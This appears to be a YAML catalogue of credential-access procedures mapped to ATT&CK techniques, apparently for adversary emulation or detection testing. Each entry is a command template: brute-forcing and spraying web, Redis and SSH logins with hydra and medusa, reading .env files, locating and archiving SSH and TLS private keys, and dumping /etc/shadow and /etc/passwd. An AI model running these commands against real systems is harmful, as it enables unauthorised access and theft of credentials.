# Credential access: guessing, spraying and files with secrets: written for the Phase 2 catalogue (spec 2.1).
attack_version: "20.1"
procedures:
  - id: brute-http-single
    technique: T1110.001
    tactic: TA0006
    source: own
    protocol: http
    template: POST /wp-login.php log=admin&pwd={{word}}
  - id: brute-redis-auth
    technique: T1110.001
    tactic: TA0006
    source: own
    protocol: redis
    template: AUTH {{word}}
  - id: brute-sudo-prep
    technique: T1110.001
    tactic: TA0006
    source: atomic
    protocol: ssh
    template: useradd -G sudo -s /bin/bash -p $(openssl passwd -1 {{word}}) {{user}}
    ref: ART T1110.001 test 1 SUDO Brute Force - Debian (ba1bf0b6-f32b-4db0-b7cc-d78cacc76700)
  - id: spray-http-login
    technique: T1110.003
    tactic: TA0006
    source: own
    protocol: http
    template: POST /wp-login.php log={{user}}&pwd={{word}}
  - id: spray-http-pma
    technique: T1110.003
    tactic: TA0006
    source: own
    protocol: http
    template: POST /phpmyadmin/ pma_username=root&pma_password={{word}}
  - id: spray-wordlist-hydra
    technique: T1110.003
    tactic: TA0006
    source: own
    protocol: ssh
    template: hydra -l root -P /tmp/{{file}} ssh://{{host}}
  - id: spray-medusa
    technique: T1110.003
    tactic: TA0006
    source: own
    protocol: ssh
    template: medusa -u root -P /tmp/{{file}} -h {{host}} ssh
  - id: creds-cat-env
    technique: T1552.001
    tactic: TA0006
    source: own
    protocol: ssh
    template: cat /var/www/html/.env
  - id: creds-find-env
    technique: T1552.001
    tactic: TA0006
    source: atomic
    protocol: ssh
    template: find {{dir}} -maxdepth 6 -name '.env' -type f 2>/dev/null
    ref: ART T1552.001 test 22 Find .env Files Containing Application Credentials (bcf8e58a-1cb7-4988-9227-3d3c70751811)
  - id: creds-write-read
    technique: T1552.001
    tactic: TA0006
    source: corpus
    protocol: ssh
    template: echo {{word}} > /tmp/{{file}} && cat /tmp/{{file}} && rm /tmp/{{file}}
  - id: creds-http-env
    technique: T1552.001
    tactic: TA0006
    source: own
    protocol: http
    template: GET /.env
  - id: creds-redis-config-hash
    technique: T1552.001
    tactic: TA0006
    source: own
    protocol: redis
    template: HGETALL app:config
  - id: keys-find-rsa
    technique: T1552.004
    tactic: TA0006
    source: own
    protocol: ssh
    template: find {{dir}} -name 'id_rsa*' 2>/dev/null
  - id: keys-list-ssh-dir
    technique: T1552.004
    tactic: TA0006
    source: own
    protocol: ssh
    template: ls -la ~/.ssh
  - id: keys-find-tls
    technique: T1552.004
    tactic: TA0006
    source: atomic
    protocol: ssh
    template: find /etc/ssl -name '*.key' -type f 2>/dev/null
    ref: ART T1552.004 test 12 Find TLS private key files (5e417277-0ae7-4ad5-a3e8-0fa27c122b29)
  - id: keys-archive-ssh
    technique: T1552.004
    tactic: TA0006
    source: own
    protocol: ssh
    template: tar czf /tmp/{{file}}.tgz ~/.ssh
  - id: dump-shadow-file
    technique: T1003.008
    tactic: TA0006
    source: atomic
    protocol: ssh
    template: cat /etc/shadow
    ref: ART T1003.008 test 1 Access /etc/shadow (Local) (3723ab77-c546-403c-8fb4-bb577033b235)
  - id: dump-passwd-copy
    technique: T1003.008
    tactic: TA0006
    source: atomic
    protocol: ssh
    template: cat /etc/passwd > /tmp/{{file}}
    ref: ART T1003.008 test 3 Access /etc/passwd (Local) (60e860b6-8ae6-49db-ad07-5e73edd88f5d)
  - id: dump-unshadow-pair
    technique: T1003.008
    tactic: TA0006
    source: own
    protocol: ssh
    template: cat /etc/passwd /etc/shadow > /tmp/{{file}}
  - id: dump-getent-shadow
    technique: T1003.008
    tactic: TA0006
    source: own
    protocol: ssh
    template: getent shadow
